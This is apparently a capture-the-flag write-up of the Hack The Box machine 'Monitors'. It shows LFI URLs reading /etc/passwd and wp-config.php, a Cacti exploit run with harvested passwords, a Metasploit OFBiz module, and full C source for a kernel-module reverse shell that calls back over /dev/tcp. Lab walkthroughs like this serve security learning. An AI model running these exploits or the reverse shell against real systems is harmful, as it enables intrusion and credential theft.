---
title: Monitors
description: c reverse shell is hard
date: 08/01/2022
---

# Monitors HTB

## Enumeration

I first scanned the machine with nmap :

```text
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-10 01:16 CEST
Nmap scan report for monitors.htb (10.10.10.238)
Host is up (0.026s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
```

Then I enumerated the apache server and found that it was a WordPress page.
With the help of [wpscan](https://github.com/wpscanteam/wpscan) I found that the plugin `wp-with-spritz` was vulnerable to an [LFI](https://www.exploit-db.com/exploits/44544).

I used this exploit to download these files :

- http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/passwd
- http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-available/000-default.conf
- http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-available/monitors.htb.conf
- http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-available/cacti-admin.monitors.htb.conf
- http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../var/www/wordpress/wp-config.php

```text
etc/passwd
root:x:0:0:root:/root:/bin/bash
[...]
marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
```

```text
000-default.conf

# Default virtual host settings
# Add monitors.htb.conf
# Add cacti-admin.monitors.htb.conf

<VirtualHost *:80>
	[...]

	ServerAdmin admin@monitors.htb
	DocumentRoot /var/www/html

	[...]
</VirtualHost>
```

```text
monitors.htb.conf

<VirtualHost *:80>
	[...]

	ServerAdmin admin@monitors.htb
	ServerName monitors.htb
	ServerAlias monitors.htb
	DocumentRoot /var/www/wordpress

	[...]
</VirtualHost>
```

```text
cacti-admin.monitors.htb

<VirtualHost *:80>
	[...]

	ServerAdmin admin@monitors.htb
	ServerName cacti-admin.monitors.htb
	DocumentRoot /usr/share/cacti
	ServerAlias cacti-admin.monitors.htb

	[...]
</VirtualHost>
```

```text
wp-config.php


define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wpadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'BestAdministrator@2020!' );

```

Now we know that there is a subdomain [cacti-admin.monitors.htb](http://cacti-admin.monitors.htb/cacti/index.php) and we have some credentials :

| username | password                |
| -------- | ----------------------- |
| wpadmin  | BestAdministrator@2020! |
| marcus   | unknown                 |

I then connected on the cacti-admin page with `user : admin` and `password : BestAdministrator@2020!`.
After that I found this [exploit](https://www.exploit-db.com/exploits/49810) and I used it like so to connect :

```bash
python3 cacti_exploit.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020! --lhost <My_IP> --lport 4444
```

```bash
nc -lnvp 4444
```

Then I found marcus password with :

```bash
$ grep -R marcus /etc 2>/dev/null

[...]
/etc/systemd/system/cacti-backup.service:ExecStart=/home/marcus/.backup/backup.sh
[...]

$ cat /home/marcus/.backup/backup.sh

[...]
config_pass="VerticalEdge2020"
[...]
```

I deduced that it was marcus password :

| username | password         |
| -------- | ---------------- |
| marcus   | VerticalEdge2020 |

I then connected via **ssh** as user marcus and got the `user.txt` flag.

```bash
$ cat user.txt
5002739f6d90c37b6c0630521e096288
```

After reading the note.txt file

```text
TODO:

Disable phpinfo	in php.ini		- DONE
Update docker image for production use	-
```

I looked for a docker process :

```bash
$ ps -ef | grep docker

root  2061  1597 0 Jun09 ?  00:00:01 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8443 -container-ip 172.17.0.2 -container-port 8443
```

To access the docker I started a port forwarding session with ssh :

```bash
ssh -L 8000:localhost:8443 marcus@monitors.htb
```

With this enabled I was able to access the page directly from my browser on http://localhost:8000.

Luckily I found an exploit in **metasploit** and got a meterpreter session.

```bash
msf6 exploit(linux/http/apache_ofbiz_deserialization) > show options

Module options (exploit/linux/http/apache_ofbiz_deserialization):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][.
                                         ..]
   RHOSTS     localhost        yes       The target host(s), range CIDR identifier, or hosts file
                                         with syntax 'file:<path>'
   RPORT      8000             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This mu
                                         st be an address on the local machine or 0.0.0.0 to liste
                                         n on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly gen
                                         erated)
   TARGETURI  /                yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter_reverse_https):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  <My_IP>          yes       The local listener hostname
   LPORT  1234             yes       The local listener port
   LURI                    no        The HTTP Path
```

Once connected on the docker through the meterpreter session I searched for a possible docker vulnerability :

```bash
$ capsh --print

[...]
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
[...]
```

The interesting part is this **cap_sys_module**, it means that we can try to insert kernel modules.

Thanks to [hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities) I was able to find a way to create and then compile a reverse-shell in c.

```c
# this program is from book.hacktricks.xyz, not from me !!

#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/<My_IP>/4242 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\
");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```makefile
obj-m +=reverse-shell.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

```bash
# on the docker
insmod reverse-shell.ko #Launch the reverse shell

# on my machine
nc -lnvp 4242
```

Finally I gained **root** access and got the last flag :

```text
# cat root.txt
c3d6f0773baa2828b70015af53b1bd61
```

### Thanks for reading :)
